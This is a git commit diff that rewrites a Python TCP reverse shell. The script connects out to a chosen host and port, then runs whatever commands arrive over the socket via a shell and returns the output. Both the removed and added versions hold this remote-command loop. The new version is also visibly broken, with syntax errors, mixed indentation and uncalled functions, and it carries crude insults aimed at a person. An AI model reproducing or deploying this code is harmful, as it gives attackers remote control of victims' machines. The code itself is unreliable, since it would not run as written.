73e3ca530576c0d1aeadd2fa5c7dea4ed2ff1f46
the-mars-project <44186631+the-mars-project@users.noreply.github.com>
2019-02-28 14:49:01 +1100

    fix reverse_shell_tcp.py
    TODO: implement SSL, refactor connection mechanism, testing - yeah it's untested, what about it.

--- reverse_shell_tcp.py
+++ reverse_shell_tcp.py
@@ -1,77 +1,68 @@
-import socket
-import subprocess
+#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+
+# Pitt sucks
+
+import socket, subprocess, argparse
+
+def arguments():
+    parser = argparse.ArgumentParser(description='Process some integers.')
+    parser.add_argument('-t', '--target', metavar='1.1.1.1', type=str)
+    parser.add_argument('-p', '--port', metavar='6969', type=int)
+    args = parser.parse_args()
+
 
 def logo():
     print ("""
 
-       .        .      . ..,*,*///**,,**.*(/.....
-       .     ,//*,. . .  .,,.******,*,,**.*//(*,.
-     ,...  ,*/////(*,..  .....  ...,./**,,*/*/***
-   ..     **///((#(###(*.. ...*(#%&%..,,,.,,**/*,
-         ./,/(/(#((######%&&&&&&&&&&&,,*,*,.,****
-  .      **,/((####%%%%%&&&&&&&&&&&&@@&,*/..,,,*(
-         *,,//#%#%%%%%%&&&%&&&&@&&&@@@&(.(/**,,,,
-   .     **,.((###%%#(#&&&&&&&&&&&&&&&, */,**,*
-   .     ,**,*/((#%(/#%&&&&&&&&&&&&&&&&&/ .,*,***
-   .    ..,, **,,(////%&&&&&&&&&%%&&&&&(, .././**
-   .     .*.      *.(#%%&&&&&&&&(&&//#/..,*,**/
-         ..          /#(%&%//,         (*  ,,,,*/
-         ,      ,/(*   ,/%*.  ./#/,   .#*. ,**,,,
-         .,.        ,*,*(((,       ..(..,***.**
-         .,,.     **,,,,%&%%&&(*   .*(/(*,...*,/*
-          ,.,/(///,*,,,,%&&&&&&%&%#%&%&, ,  .****
-          . ..*/(*,,,.,*%&&&(%&&%%%%#* .. ,*,*.
-           . .****...,(#%%&&%(%%&%%#%%,, ..,.,*,,
-            .. ,..***,..,*##%%%&(##((%.    ,.,. ,
-              ,  ***/##/#*%&&&%#(,.,(          . 
-               .. ......   ......*#              
-                  ...,. ...,,//*#.               
-                   ,,*//(######                  
-                    .,*(##%#(   
-             "Introduce a little Anarchy"                                                                                                           
+Hit or miss, I guess they never miss.. huh?                                                                                        
                   
-                  - Pitts_Scripts  
+                  - Plaintexticus
     
     """)
 
-def reverse_shell():
-    print("What is the Host IP Address? i.e. 127.0.0.1")
-    host = raw_input("> ")
-    print("What is the Port? i.e. 443")
-    port = input("> ")
-    TEST = 'whoami'
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    while True:
+def preparation():
+    """ Checks the cli arguments for network details and requests them if not supplied. """
+    target = args.target
+    port = args.port
+    if port is None:
+        port = input('Input target port.')
+    if target is None:
+        target = input('Input target IP address.')
         try:
-            s.connect_ex((host, port))
-        except socket.error:
-            print("Could not connect to host.")
-        CMD = subprocess.Popen(TEST, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        s.send(CMD.stdout.read())
-        print("Connected!")
-        while True:
-            command = s.recv(1024)
-            if 'exit' in command:
-                s.close()
-            else:
-                CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                s.send(CMD.stdout.read())
-                s.send(CMD.stderr.read())
-
-def menu():
-
-    logo()
-
-    print ("""
-    Do you want a reverse shell?
-    1). Yes
-    2). No""")
-
+            socket.inet_aton(target)
+            if not int(port):
+                raise OSError
+        except OSError:
+            print('Error 01: You supplied Invalid Network details. {}, {}'.format(target, port)
+            exit(1)
+    return((target, port))
+    
+                  
+#going to refactor below when I have more time.
+def connection(networking)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	try:
+		s.connect(networking)
+    except socket.error:
+        print("Connection Failed.")
+		exit(1)
+    CMD = subprocess.Popen(['echo', 'pittsux'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    s.send(CMD.stdout.read())
     while True:
-        option = raw_input("> ")
-        if option == "1":
-            reverse_shell()
-        elif option == "2":
-            exit()
+		#Not sure about this.
+        command = s.recv(1024)
+        if 'exit' in command:
+            s.close()
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            s.send(CMD.stdout.read())
+            s.send(CMD.stderr.read())
 
-menu()
+# Fuck menus.
+
+                  
+def main():
+	logo()
+	networking = arguments()
+	connection(networking)
